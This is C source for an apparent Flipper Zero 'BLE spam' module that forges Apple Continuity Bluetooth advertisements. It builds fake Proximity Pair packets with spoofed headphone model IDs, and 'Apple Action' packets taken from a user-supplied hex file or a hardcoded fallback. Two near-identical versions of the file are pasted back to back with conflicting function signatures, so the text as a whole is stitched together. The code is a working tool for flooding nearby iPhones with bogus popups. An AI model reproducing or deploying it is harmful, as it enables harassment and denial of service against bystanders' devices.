#include "continuity.h"
#include <storage/storage.h>

#define CUSTOM_PACKETS_PATH EXT_PATH("apps_data/ble_spam/apple_custom.txt")
#define MAX_CUSTOM_PAYLOAD_LEN 31

static uint8_t custom_payload[MAX_CUSTOM_PAYLOAD_LEN];
static uint8_t custom_payload_len = 0;

static uint8_t hex_to_byte(char c) {
    if(c >= '0' && c <= '9') return c - '0';
    if(c >= 'a' && c <= 'f') return c - 'a' + 10;
    if(c >= 'A' && c <= 'F') return c - 'A' + 10;
    return 0;
}

static void load_custom_apple_packet(void) {
    Storage* storage = furi_record_open(RECORD_STORAGE);
    File* file = storage_file_alloc(storage);
    custom_payload_len = 0;
    
    if(storage_file_open(file, CUSTOM_PACKETS_PATH, FSAM_READ, FSOM_OPEN_EXISTING)) {
        char buffer[128]; // Безопасный строковый буфер
        uint16_t read = storage_file_read(file, buffer, sizeof(buffer) - 1);
        if(read > 0) {
            buffer[read] = '\0';
            char* hex_start = strchr(buffer, ':');
            if(hex_start) {
                hex_start++;
                while(*hex_start && custom_payload_len < MAX_CUSTOM_PAYLOAD_LEN) {
                    if(*hex_start == ' ' || *hex_start == '\r' || *hex_start == '\n') {
                        hex_start++;
                        continue;
                    }
                    if(*hex_start && *(hex_start + 1)) {
                        custom_payload[custom_payload_len] = (hex_to_byte(*hex_start) << 4) | hex_to_byte(*(hex_start + 1));
                        custom_payload_len++;
                        hex_start += 2;
                    } else {
                        break;
                    }
                }
            }
        }
    }
    storage_file_close(file);
    storage_file_free(file);
    furi_record_close(RECORD_STORAGE);
}

static const char* protocol_continuity_get_name(const ContinuityMsg* msg) {
    if(msg->type == ContinuityTypeProximityPair) {
        return "Proximity Pair";
    } else if(msg->type == ContinuityTypeAppleAction) {
        return "Apple Action / Custom";
    }
    return "Unknown";
}

static void protocol_continuity_generate_packet(const ContinuityMsg* msg, uint8_t* out_tx_data, uint8_t* out_tx_len) {
    uint8_t i = 0;

    if(msg->type == ContinuityTypeProximityPair) {
        out_tx_data[i++] = 0x4C;
        out_tx_data[i++] = 0x00;
        out_tx_data[i++] = 0x07;
        out_tx_data[i++] = 0x19;
        
        uint16_t model;
        if(msg->data.proximity_pair.model != 0x0000) {
            model = msg->data.proximity_pair.model;
        } else {
            const uint16_t models[] = {
                0x0E20, 0x0620, 0x0A20, 0x1020, 0x0055, 0x0030, 0x0220, 0x0F20, 0x1320, 0x1420
            };
            model = models[rand() % COUNT_OF(models)];
        }
        
        out_tx_data[i++] = (model >> 8) & 0xFF;
        out_tx_data[i++] = model & 0xFF;
        out_tx_data[i++] = 0x20;
        out_tx_data[i++] = 0x10;
        out_tx_data[i++] = 0x42;
        out_tx_data[i++] = 0x04;
        while(i < 31) out_tx_data[i++] = rand() % 256;
        *out_tx_len = i;

    } else if(msg->type == ContinuityTypeAppleAction) {
        // Подгружаем ваш HEX-пакет с SD-карты
        load_custom_apple_packet();
        if(custom_payload_len > 0) {
            memcpy(out_tx_data, custom_payload, custom_payload_len);
            *out_tx_len = custom_payload_len;
        } else {
            // Оригинальное поведение, если файла нет в apps_data
            out_tx_data[i++] = 0x4C; out_tx_data[i++] = 0x00;
            out_tx_data[i++] = 0x0F; out_tx_data[i++] = 0x05;
            out_tx_data[i++] = 0xC1; out_tx_data[i++] = 0x01;
            out_tx_data[i++] = rand() % 256;
            out_tx_data[i++] = 0x00; out_tx_data[i++] = 0x00;
            *out_tx_len = i;
        }
    }
}

const BleSpamProtocol ble_spam_protocol_continuity = {
    .icon = &I_apple,
    .get_name = protocol_continuity_get_name,
    .generate_packet = protocol_continuity_generate_packet,
};
#include "continuity.h"
#include <storage/storage.h>

#define CUSTOM_PACKETS_PATH EXT_PATH("apps_data/ble_spam/apple_custom.txt")
#define MAX_CUSTOM_PAYLOAD_LEN 31

static uint8_t custom_payload[MAX_CUSTOM_PAYLOAD_LEN];
static uint8_t custom_payload_len = 0;

static const char* protocol_continuity_get_name(const BleSpamItem* item) {
    if(item->type == ContinuityTypeProximityPair) {
        return "Proximity Pair";
    } else if(item->type == ContinuityTypeAppleAction) {
        return "Custom Packet (File)";
    }
    return "Unknown";
}

static const BleSpamItem items_continuity[] = {
    {ContinuityTypeProximityPair, &I_apple},
    {ContinuityTypeAppleAction, &I_apple},
};

static size_t protocol_continuity_get_items(const BleSpamItem** items) {
    *items = items_continuity;
    return COUNT_OF(items_continuity);
}

static uint8_t hex_to_byte(char c) {
    if(c >= '0' && c <= '9') return c - '0';
    if(c >= 'a' && c <= 'f') return c - 'a' + 10;
    if(c >= 'A' && c <= 'F') return c - 'A' + 10;
    return 0;
}

static void load_custom_apple_packet(void) {
    Storage* storage = furi_record_open(RECORD_STORAGE);
    File* file = storage_file_alloc(storage);
    custom_payload_len = 0;
    
    if(storage_file_open(file, CUSTOM_PACKETS_PATH, FSAM_READ, FSOM_OPEN_EXISTING)) {
        char buffer[128];
        uint16_t read = storage_file_read(file, buffer, sizeof(buffer) - 1);
        if(read > 0) {
            buffer[read] = '\0';
            char* hex_start = strchr(buffer, ':');
            if(hex_start) {
                hex_start++;
                while(*hex_start && custom_payload_len < MAX_CUSTOM_PAYLOAD_LEN) {
                    if(*hex_start == ' ' || *hex_start == '\r' || *hex_start == '\n') {
                        hex_start++;
                        continue;
                    }
                    if(*hex_start && *(hex_start + 1)) {
                        custom_payload[custom_payload_len] = (hex_to_byte(*hex_start) << 4) | hex_to_byte(*(hex_start + 1));
                        custom_payload_len++;
                        hex_start += 2;
                    } else {
                        break;
                    }
                }
            }
        }
    }
    storage_file_close(file);
    storage_file_free(file);
    furi_record_close(RECORD_STORAGE);
}

static void protocol_continuity_generate_packet(const BleSpamItem* item, const BleSpamMsg* msg, uint8_t* out_tx_data, uint8_t* out_tx_len) {
    uint8_t i = 0;

    if(item->type == ContinuityTypeProximityPair) {
        out_tx_data[i++] = 0x4C;
        out_tx_data[i++] = 0x00;
        out_tx_data[i++] = 0x07;
        out_tx_data[i++] = 0x19;
        
        uint16_t model;
        if(msg && msg->data.continuity.proximity_pair.model != 0x0000) {
            model = msg->data.continuity.proximity_pair.model;
        } else {
            const uint16_t models[] = {
                0x0E20, 0x0620, 0x0A20, 0x1020, 0x0055, 0x0030, 0x0220, 0x0F20, 0x1320, 0x1420
            };
            model = models[rand() % COUNT_OF(models)];
        }
        
        out_tx_data[i++] = (model >> 8) & 0xFF;
        out_tx_data[i++] = model & 0xFF;
        out_tx_data[i++] = 0x20;
        out_tx_data[i++] = 0x10;
        out_tx_data[i++] = 0x42;
        out_tx_data[i++] = 0x04;
        while(i < 31) out_tx_data[i++] = rand() % 256;
        *out_tx_len = i;

    } else if(item->type == ContinuityTypeAppleAction) {
        // Перехватываем управление: вместо генерации стандартного экшена читаем ваш файл
        load_custom_apple_packet();
        if(custom_payload_len > 0) {
            memcpy(out_tx_data, custom_payload, custom_payload_len);
            *out_tx_len = custom_payload_len;
        } else {
            // Резервный дефолтный экшен, если файла нет на карте памяти
            out_tx_data[i++] = 0x4C; out_tx_data[i++] = 0x00;
            out_tx_data[i++] = 0x0F; out_tx_data[i++] = 0x05;
            out_tx_data[i++] = 0xC1; out_tx_data[i++] = 0x01;
            out_tx_data[i++] = rand() % 256;
            *out_tx_len = i;
        }
    }
}

const BleSpamProtocol ble_spam_protocol_continuity = {
    .icon = &I_apple,
    .get_name = protocol_continuity_get_name,
    .get_items = protocol_continuity_get_items,
    .generate_packet = protocol_continuity_generate_packet,
};
